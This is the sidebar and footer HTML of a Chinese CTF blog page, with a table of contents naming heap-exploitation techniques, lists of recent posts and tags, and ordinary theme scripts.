href="#House-of-Rabbit"><span>House of Rabbit</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-原理-2" href="#原理-2"><span>原理</span></a></li><li><a class="is-flex toc-item" id="toc-item-总结-1" href="#总结-1"><span>总结</span></a></li><li><a class="is-flex toc-item" id="toc-item-例题" href="#例题"><span>例题</span></a></li></ul></li><li><a class="is-flex toc-item" id="toc-item-House-of-Roman" href="#House-of-Roman"><span>House of Roman</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-概括" href="#概括"><span>概括</span></a></li></ul></li></ul></div></div><script type="text/javascript" async>
        $(document).ready(function () { //参考自 https://github.com/ppoffice/hexo-theme-icarus/pull/616/files
            var observerTopMargin;
            var scrollObserver;
            var headerElems = $(".headerlink");
            var activeTocItem;
        
            function initIntersectionObserver(docHeight) {
                observerTopMargin = docHeight;
                scrollObserver = new IntersectionObserver(scrollCallBack,
                    {
                        root: null,  // viewpoint
                        rootMargin: docHeight + "px 0px -80% 0px"  // cover top 30% of viewport to the top of document
                    })
            }
        
            function scrollCallBack(entries, observer) {
                if ($(window).scrollTop() > observerTopMargin * 0.7) { 
                    // User somehow scroll to 70% of observerTopMargin (which is inited as 200% document height)
                    // Observer top margin need to extend to cover all the space to the top of the document
                    initIntersectionObserver(observerTopMargin * 2)
                    observer.disconnect();
                    return;
                }
                let toActive;
                if (entries[0].intersectionRatio == 1) {  // enter viewed area
                    let entry = entries.reduce((u, v) => (u.target.toc_id > v.target.toc_id ? u : v));  // get the lowest item
                    toActive = $("#toc-item-" + $(entry.target).attr("href").substr(1));
                } else {
                    let entry = entries.reduce((u, v) => (u.target.toc_id < v.target.toc_id ? u : v));  // get the highest item
                    let idx = Math.max(entry.target.toc_id - 1, 0);
                    toActive = $("#toc-item-" + $(headerElems[idx]).attr("href").substr(1));
                }
                if (activeTocItem) activeTocItem.removeClass("is-current");
                activeTocItem = toActive
                activeTocItem.addClass("is-current");
            }
        
            initIntersectionObserver($(document).height() * 2);
            headerElems.each(function (index, obj) {
                obj.toc_id = index;
                scrollObserver.observe(obj);
            })
        });</script></div><div class="card widget"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="is-rounded" src="http://ggb0n.cool/images/header.jpg" alt="ggb0n"></figure><p class="title is-size-4 is-block line-height-inherit">ggb0n</p><p class="is-size-6 is-block">闭关ing。。。</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>伟大的中国</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives"><p class="title">41</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Categories</p><a href="/categories"><p class="title">15</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags"><p class="title">117</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/ggb0n" target="_blank" rel="noopener">Follow</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-white is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/ggb0n"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-white is-marginless" target="_blank" rel="noopener" title="Weibo" href="https://weibo.com/u/5955623314"><i class="fab fa-weibo"></i></a><a class="level-item button is-transparent is-white is-marginless" target="_blank" rel="noopener" title="Email" href="mailto:gg.b0n@qq.com"><i class="fa fa-envelope"></i></a><a class="level-item button is-transparent is-white is-marginless" target="_blank" rel="noopener" title="Next" href="https://ggb0n.github.io/"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-white is-marginless" target="_blank" rel="noopener" title="RSS" href="/atom.xml"><i class="fas fa-rss"></i></a></div><div><hr><p id="hitokoto">:D 一言句子获取中...</p><script type="text/javascript" defer>function getYiyan(){
                                $.getJSON("https://v1.hitokoto.cn/", function (data) {
                                if(data){
                                    $('#hitokoto').html("");
                                    $('#hitokoto').append("<strong style='color: #3273dc;'>"+data.hitokoto+"</strong>"+
                                    "<p>"+"来源《"+data.from+"》</p><p>提供者-"+data.creator+"</p>");
                                }});}
                                $(function (){getYiyan();$('#hitokoto').click(function(){getYiyan();})});</script></div></div></div><div class="card widget"><div class="card-content"><h3 class="menu-label">Latest Comment</h3><span class="body_hot_comment">Loading...Wait a Minute!</span></div></div><div class="card widget"><div class="card-content"><h3 class="menu-label">Recent</h3><article class="media"><div class="media-content size-small"><p><time dateTime="2020-07-26T07:04:04.000Z">2020-07-26</time></p><p class="title is-6"><a class="link-muted" href="/2020/07/26/DASCTF%E4%B8%83%E6%9C%88%E6%9C%88%E8%B5%9BPWN/">DASCTF七月月赛PWN</a></p><p class="is-uppercase"><i class="fas fa-folder-open has-text-grey"> </i><a class="link-muted" href="/categories/CTF/">CTF</a> / <a class="link-muted" href="/categories/CTF/%E6%AF%94%E8%B5%9B%E5%88%92%E6%B0%B4/">比赛划水</a></p></div></article><article class="media"><a class="media-left" href="/2020/07/26/CybricsCTF/"><p class="image is-64x64"><img class="thumbnail" src="http://ggb0n.cool/images/cybrics00.png" alt="CybricsCTF"></p></a><div class="media-content size-small"><p><time dateTime="2020-07-26T03:07:55.000Z">2020-07-26</time></p><p class="title is-6"><a class="link-muted" href="/2020/07/26/CybricsCTF/">CybricsCTF</a></p><p class="is-uppercase"><i class="fas fa-folder-open has-text-grey"> </i><a class="link-muted" href="/categories/CTF/">CTF</a> / <a class="link-muted" href="/categories/CTF/%E6%AF%94%E8%B5%9B%E5%88%92%E6%B0%B4/">比赛划水</a></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2020-07-09T14:35:56.000Z">2020-07-09</time></p><p class="title is-6"><a class="link-muted" href="/2020/07/09/BUU%E5%A0%86%E6%BA%A2%E5%87%BA%E8%AE%AD%E7%BB%83/">BUU堆溢出训练</a></p><p class="is-uppercase"><i class="fas fa-folder-open has-text-grey"> </i><a class="link-muted" href="/categories/CTF/">CTF</a> / <a class="link-muted" href="/categories/CTF/BUU%E5%88%B7%E9%A2%98/">BUU刷题</a></p></div></article><article class="media"><a class="media-left" href="/2020/06/29/TCTF2020%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"><p class="image is-64x64"><img class="thumbnail" src="http://ggb0n.cool/images/tctf-top.png" alt="TCTF2020部分题解"></p></a><div class="media-content size-small"><p><time dateTime="2020-06-29T08:47:34.000Z">2020-06-29</time></p><p class="title is-6"><a class="link-muted" href="/2020/06/29/TCTF2020%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">TCTF2020部分题解</a></p><p class="is-uppercase"><i class="fas fa-folder-open has-text-grey"> </i><a class="link-muted" href="/categories/CTF/">CTF</a> / <a class="link-muted" href="/categories/CTF/%E6%AF%94%E8%B5%9B%E5%88%92%E6%B0%B4/">比赛划水</a></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2020-06-26T15:37:19.000Z">2020-06-26</time></p><p class="title is-6"><a class="link-muted" href="/2020/06/26/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4pwn%E9%A2%98%E7%BB%83%E4%B9%A0/">第五空间pwn题练习</a></p><p class="is-uppercase"><i class="fas fa-folder-open has-text-grey"> </i><a class="link-muted" href="/categories/CTF/">CTF</a> / <a class="link-muted" href="/categories/CTF/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/">赛题复现</a></p></div></article></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Categories</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/categories/CTF/"><span class="level-start"><span class="level-item">CTF</span></span><span class="level-end"><span class="level-item tag">32</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/CTF/BUU%E5%88%B7%E9%A2%98/"><span class="level-start"><span class="level-item">BUU刷题</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/CTF/web%E5%AE%89%E5%85%A8/"><span class="level-start"><span class="level-item">web安全</span></span><span class="level-end"><span class="level-item tag">6</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/CTF/web%E5%AE%89%E5%85%A8/BUU%E5%88%B7%E9%A2%98/"><span class="level-start"><span class="level-item">BUU刷题</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/CTF/web%E5%AE%89%E5%85%A8/CTFHub%E5%88%B7%E9%A2%98/"><span class="level-start"><span class="level-item">CTFHub刷题</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/CTF/web%E5%AE%89%E5%85%A8-BUU%E5%88%B7%E9%A2%98/"><span class="level-start"><span class="level-item">web安全 - BUU刷题</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/CTF/%E4%BA%8C%E8%BF%9B%E5%88%B6/"><span class="level-start"><span class="level-item">二进制</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/CTF/%E6%AF%94%E8%B5%9B%E5%88%92%E6%B0%B4/"><span class="level-start"><span class="level-item">比赛划水</span></span><span class="level-end"><span class="level-item tag">10</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/CTF/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/"><span class="level-start"><span class="level-item">赛题复现</span></span><span class="level-end"><span class="level-item tag">8</span></span></a></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/CTF-%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/"><span class="level-start"><span class="level-item">CTF - 赛题复现</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><a class="level is-mobile is-marginless" href="/categories/"><span class="level-start"><span class="level-item">查看全部&gt;&gt;</span></span></a></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Archives</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/archives/2020/07/"><span class="level-start"><span class="level-item">July 2020</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/06/"><span class="level-start"><span class="level-item">June 2020</span></span><span class="level-end"><span class="level-item tag">8</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/05/"><span class="level-start"><span class="level-item">May 2020</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/04/"><span class="level-start"><span class="level-item">April 2020</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/03/"><span class="level-start"><span class="level-item">March 2020</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><a class="level is-mobile is-marginless" href="/archives/"><span class="level-start"><span class="level-item">查看全部&gt;&gt;</span></span></a></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/SQL%E6%B3%A8%E5%85%A5/"><span class="tag">SQL注入</span><span class="tag is-grey-lightest">10</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Cookie%E6%94%BB%E5%87%BB/"><span class="tag">Cookie攻击</span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/JWT%E4%BC%AA%E9%80%A0/"><span class="tag">JWT伪造</span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/RSA%E6%94%BB%E5%87%BB/"><span class="tag">RSA攻击</span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/bypass-functions-disable/"><span class="tag">bypass functions_disable</span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"><span class="tag">反序列化漏洞</span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><span class="tag">文件上传</span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/webshell/"><span class="tag">webshell</span><span class="tag is-grey-lightest">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/"><span class="tag">布尔盲注</span><span class="tag is-grey-lightest">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Linux/"><span class="tag">Linux</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/RCE/"><span class="tag">RCE</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/SSRF/"><span class="tag">SSRF</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/SSTI/"><span class="tag">SSTI</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"><span class="tag">二次注入</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E/"><span class="tag">反序列化逃逸漏洞</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/"><span class="tag">堆溢出</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"><span class="tag">报错注入</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/"><span class="tag">条件竞争</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/CVE/"><span class="tag">CVE</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/IO-FILE%E6%BC%8F%E6%B4%9E/"><span class="tag">IO_FILE漏洞</span><span class="tag is-grey-lightest">2</span></a></div></div><div class="field is-grouped is-grouped-multiline"><a class="tags has-addons" href="/tags/"><span class="tag">查看全部&gt;&gt;</span></a></div></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Subscribe to Updates</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=ggb0nsBlog&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="ggb0nsBlog" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button is-primary" type="submit" value="Subscribe"></div></div><p class="help">输入邮箱订阅本博客，更博后邮件通知师傅！👾</p></form></div></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo1.png" alt="ggb0n&#039;s Blog" height="28"></a><p class="size-small"><span>&copy; 2020 ggb0n</span>  Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a>,Modify by <a href="https://github.com/removeif/hexo-theme-amazing" target="_blank">removeif</a> <br><span>© <a href="http://www.beian.miit.gov.cn/" target="_blank">豫ICP备20003023号</a><br></span><span>© Copyright：All contents of this blog are learned from the Internet or original,Facilitate<br />&nbsp;&nbsp;&nbsp;&nbsp;learning and communication, if there is infringement，Please <a href="/message" target="_blank">leave a message</a>.<br /></span><span><span id="statistic-times">loading...</span><script>function createTime(time) {
            var n = new Date(time);
            now.setTime(now.getTime() + 250),
                days = (now - n) / 1e3 / 60 / 60 / 24,
                dnum = Math.floor(days),
                hours = (now - n) / 1e3 / 60 / 60 - 24 * dnum,
                hnum = Math.floor(hours),
            1 == String(hnum).length && (hnum = "0" + hnum),
                minutes = (now - n) / 1e3 / 60 - 1440 * dnum - 60 * hnum,
                mnum = Math.floor(minutes),
            1 == String(mnum).length && (mnum = "0" + mnum),
                seconds = (now - n) / 1e3 - 86400 * dnum - 3600 * hnum - 60 * mnum,
                snum = Math.round(seconds),
            1 == String(snum).length && (snum = "0" + snum),
                document.getElementById("statistic-times").innerHTML = "❤️Site from <strong>"+time.split(" ")[0].replace(/\//g,".")+"</strong> has existed <strong>" + dnum + "</strong> d <strong>" + hnum + "</strong> h <strong>" + mnum + "</strong> m <strong>" + snum + "</strong> s！❤️";
        }var now = new Date();setInterval("createTime('2020/02/02 00:00:00')", 250,"");</script><br></span><div class="size-small"><span>❤️thx <strong><span id="busuanzi_value_site_uv">99+</span></strong> users <strong><span id="busuanzi_value_site_pv">99+</span></strong> visited！❤️</span></div></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ggb0n"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdnjs.loli.net/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            site: {
                url: 'http://ggb0n.cool',
                external_link: {"enable":true,"exclude":[]}
            },
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="https://cdnjs.loli.net/ajax/libs/clipboard.js/2.0.4/clipboard.min.js" defer></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to Top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back-to-top.js" defer></script><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.12/js/lightgallery-all.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/js/jquery.justifiedGallery.min.js" defer></script><!--!--><!--!--><!--!--><script src="/js/toc.js" defer></script><script src="/js/main.js" defer></script><script>$.getScript('/js/comment-issue-data.js',function(){loadIssueData('0a75c84e24da4e774d10','80c72733da730b019e5047ae6c7eff937914a4d9','ggb0n','blog_comment',false);})</script><link rel="stylesheet" href="/css/insight.css"><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="Type something..."><span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"></div></div></div></div><script>(function (window) {
            var INSIGHT_CONFIG = {
                TRANSLATION: {
                    POSTS: 'Posts',
                    PAGES: 'Pages',
                    CATEGORIES: 'Categories',
                    TAGS: 'Tags',
                    UNTITLED: '(Untitled)',
                },
                CONTENT_URL: '/content.json',
            };
            window.INSIGHT_CONFIG = INSIGHT_CONFIG;
        })(window);</script><script src="/js/insight.js" defer></script></body></html>